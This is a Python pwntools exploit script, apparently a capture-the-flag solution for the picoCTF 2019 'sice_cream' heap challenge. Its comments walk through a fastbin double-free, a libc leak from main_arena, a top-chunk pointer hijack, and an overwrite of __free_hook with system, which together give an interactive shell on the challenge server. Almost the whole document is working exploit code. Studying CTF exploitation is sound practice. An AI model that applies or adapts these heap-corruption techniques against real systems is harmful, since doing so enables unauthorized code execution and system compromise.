#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './sice_cream'
HOST, PORT = '2019shell1.picoctf.com', 38495

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(name):
    p.sendlineafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''

# Initialize our name to look like a fake chunk header with size 0x61
initialize(p64(0) + p64(0x61) + p64(0))

# Address of name global variable (PIE is disabled)
fake_chunk = 0x602040

# Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
add(0x58, 'A'*0x58) # 0
add(0x58, 'B'*0x58) # 1
add(0x58, 'C'*0x58) # 2

# Double free chunk 0
free(0)
free(1)
free(0)

# Get chunk 0 back, and overwrite it's FD with fake chunk
add(0x58, p64(fake_chunk) + 'A'*0x50) # 3

# Three more frees, chunk 6 will be at name
add(0x58, 'B'*0x58) # 4
add(0x58, 'A'*0x58) # 5
add(0x58, 'C'*0x58) # 6

# Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
reintroduce(p64(0) + p64(0x91) + p64(0x21)*23)

# Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
free(6)

# We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n<main_arena_addr>'
# We just format it correctly to get the leak
leak = u64(reintroduce('A'*(0x8+0x7) + '\n').split('\n')[1][:-1].ljust(8, '\x00'))

# Calculate all offsets needed
main_arena = leak - 0x58
libc.address = leak - 0x3c4b78
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('main arena: ' + hex(main_arena))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))

'''
This next step is just crazy. I had no idea how to go about getting a chunk on malloc_hook
due to the 0x58 allocation size constraint. Getting a chunk on __free_hook was out of the
question. I spent about a day trying to do a version of the House of Orange from HITCON
CTF 2016, but failed to do so due to the size constraints again.

The next day, NotDeGhost from redpwn hinted me towards the fact that poortho (the author of
this challenge) had created a similar challenge before, so I looked him up and found a
couple writeups of his challenge hard_heap from HSCTF-6.

Basically, in the main arena of libc, there is a pointer known as the top pointer that
exists right after the fastbins. This pointer essentially points to the memory address
that gets used whenever the top chunk is used to service allocations. If we can change
this top pointer and have it point to some other memory region, any allocations that
need to use the top chunk will now give us allocations at that memory address.

The only restriction is that this new memory address must look similar to what the top chunk
header looks like.

I first tried to get a chunk on malloc_hook, however none of the one_gadgets worked, so I
had to come up with something else.

NotDeGhost again told me that it is possible to get a chunk on free_hook, and I was
dumbstruck. Took me a while but I realized how to do it.

The solution will amaze you for sure.
'''
# We don't want subsequent allocations to come out of the unsorted bin
# Since the unsorted bin only has our fake chunk and we need to use our fake chunk elsewhere, it will be corrupted
# When our fake chunk is corrupted, any subsequent mallocs will just crash due to the unsorted bin being used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61, then allocating a 0x58 chunk
reintroduce(p64(0) + p64(0x61) + p64(leak) + p64(leak) + p64(0)*9 + p64(0x21))
add(0x58, 'A'*0x58) # 7

# We fake a 0x20 sized chunk and free it. We will use this as a basis for our fake chunk in main_arena
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk
# Remember this chunk is in the .bss segment, so its address is 0x602040. Notice the 0x60 on the highest byte
reintroduce(p64(0) + p64(0x31) + p64(0x21)*8)
free(6)

# Now we free a 0x61 sized chunk to prepare for a fastbin attack to get a chunk in the main arena
reintroduce(p64(0) + p64(0x61) + p64(0x21)*18)
free(6)

# This is the address where the 0x602040 address from above looks 16 byte aligned
fake_chunk_top = main_arena + 0x10 - 0x6

# We set our fake chunk's fd pointer (in the .bss segment) to point to our fake chunk in main arena
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_top) + p64(0))

# Chunk 9 will be in main arena, we overwrite it with free_hook-0x1100+0x70-0x5
# If you look at that address-0x10, you will see this address fits what the top chunk header looks like
# So we set the top chunk pointer to that address (free_hook-0x1100+0x70-0x5)
add(0x50, 'B'*0x50) # 8
add(0x50, '\x00'*0x3e + p64(free_hook - 0x1100 + 0x70 - 0x5)) # 9

# Now the next chunk was a test to see if it worked
# This chunk should be placed at free_hook-0x1100+0x70-0x5
add(0x58, 'A'*8) # 10

# Next, my plan was to do enough mallocs so we can reach free_hook from free_hook-0x1100 ...
# The program however has a limit of 19 chunks, so I decided to get a fake chunk right above the global array
# I then zero out the first 11 indexes of that array

# Address of the fake chunk above the array
fake_chunk_above_array = 0x602130

# Change the name so that it places a fake chunk header right at that address from above
reintroduce(p64(0) + p64(0x61) + p64(0)*11 + p64(0x21) + p64(0)*17 + p64(0x61))

# Free the fake_chunk at the name
free(6)

# Overwrite its fd with the address of our fake chunk above the global array
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

# Chunk 12 will be above the global array, zero out a bunch of indexes
add(0x58, 'A'*0x58) # 11
add(0x58, p64(0)*11) # 12, Free up indexes 0-10

# Now there is a reference to fake_chunk (at our name) at idx 11
# This can easily be verified by viewing the array in gdb

# Now, this was a bit of trial and error, but I found out that 51 allocations of size 0x48 was enough to reach free_hook
# Each time we allocate, then we zero out the global array immediately
for i in range(51):
    # Allocate using top chunk
    add(0x48, '\x00'*0x48)

    # Free our fake_chunk on the name
    free(11)

    # Change fd to point to fake_chunk_above_array
    reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

    # Two more allocations, zero out the indexes
    add(0x58, 'A'*0x58)
    add(0x58, p64(0)*11)

# After 51 allocations, we can overwrite __free_hook with system
# We have to keep null bytes before it, otherwise the program will crash (I dont know why)
add(0x48, '\x00'*0x35 + p64(system))

# Then just put '/bin/sh\x00' into our name array
reintroduce(p64(0) + p64(0x61) + '/bin/sh\x00')

# Call free(fake_chunk), which calls system(fake_chunk), which calls system('/bin/sh\x00')
free(11)

p.interactive()
